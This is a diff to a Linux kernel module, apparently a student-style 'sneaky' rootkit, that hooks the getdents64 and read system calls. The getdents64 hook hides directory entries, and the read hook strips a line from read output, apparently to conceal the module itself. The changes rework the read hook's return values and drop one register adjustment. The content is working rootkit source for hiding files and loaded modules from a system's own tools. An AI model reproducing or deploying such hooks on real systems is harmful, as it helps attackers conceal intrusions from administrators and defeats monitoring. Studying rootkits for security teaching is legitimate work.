@@ -89,7 +89,6 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
     int remaining_size = original_result - (curr_pos + deleted_size);
     sneaky_result -= deleted_size;
     memmove(curr_dirp, curr_dirp + 1, remaining_size);
-    regs->si -= deleted_size;
   }
   
   return sneaky_result;
@@ -101,7 +100,6 @@ asmlinkage int (*original_read)(struct pt_regs *);
 asmlinkage int sneaky_sys_read(struct pt_regs *regs)
 {
   int original_result = (*original_read)(regs);
-  int sneaky_result = original_result;
 
   
   char * original_buf = (char *) regs->si;
@@ -110,12 +108,19 @@ asmlinkage int sneaky_sys_read(struct pt_regs *regs)
   if( sneaky_mod_buf != NULL){
     char * after_sneaky_mod_buf = strchr(sneaky_mod_buf, '\n');
     if(after_sneaky_mod_buf != NULL){
+
       int line_size = after_sneaky_mod_buf - sneaky_mod_buf + 1;
+      int sneaky_result = original_result - line_size;
       memmove(sneaky_mod_buf, after_sneaky_mod_buf + 1, original_result - line_size);
-      sneaky_result -= line_size;
+      return sneaky_result;
+    }
+    else{
+      return original_result;
     }
   }
-  return sneaky_result;
+  else{
+    return original_result;
+  }
 }
 
 // The code that gets executed when the module is loaded
